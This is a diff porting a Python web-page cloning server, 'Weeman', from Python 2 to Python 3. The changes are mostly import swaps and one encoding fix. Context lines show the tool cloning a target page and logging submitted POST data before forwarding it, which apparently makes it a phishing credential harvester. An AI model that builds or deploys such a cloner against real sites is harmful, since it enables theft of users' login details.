@@ -6,9 +6,9 @@
 # See 'LICENSE' file for copying 
 #
 
-import SimpleHTTPServer
-import SocketServer
-import urllib2
+import http.server
+import socketserver
+import urllib.request, urllib.error, urllib.parse
 import cgi
 import os
 from socket import error as socerr
@@ -17,7 +17,7 @@ from core.config import __codename__
 from core.misc import printt
 from bs4 import BeautifulSoup as bs
 
-class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
+class handler(http.server.SimpleHTTPRequestHandler):
     ## Set server version
     server_version = "Weeman %s (%s)" %(__version__, __codename__)
 
@@ -41,7 +41,7 @@ class handler(SimpleHTTPServer.SimpleHTTPRequestHandler):
             logger.close()
             from core.shell import action_url
             create_post(url,action_url, post_request)
-            SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)
+            http.server.SimpleHTTPRequestHandler.do_GET(self)
         except socerr as e:
             printt(3, "Something wrong: (%s) igonring ..." %str(e))
         except Exception as e:
@@ -68,7 +68,7 @@ class weeman(object):
 
     def request(self,url):
             from core.shell import user_agent
-            opener = urllib2.build_opener()
+            opener = urllib.request.build_opener()
             opener.addheaders = [('User-Agent', user_agent),
                     ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"),
                     #("Accept-Language","en-US,en;q=0.9,en;q=0.8"),
@@ -153,12 +153,12 @@ class weeman(object):
             printt(3, "Something happen: (%s) igonring ..." %str(e))
 
         with open("index.html", "w") as index:
-            index.write(data.prettify().encode('utf-8'))
+            index.write(str(data.prettify()))
             index.close()
         printt(3, "the HTML page will redirect to ref.html ...")
     def serve(self):
         printt(3, "\033[01;35mStarting Weeman %s server on 0.0.0.0:%d\033[00m" %(__version__, self.port))
-        self.httpd = SocketServer.TCPServer(("", self.port),handler)
+        self.httpd = socketserver.TCPServer(("", self.port),handler)
         self.httpd.serve_forever()
     
     def cleanup(self):
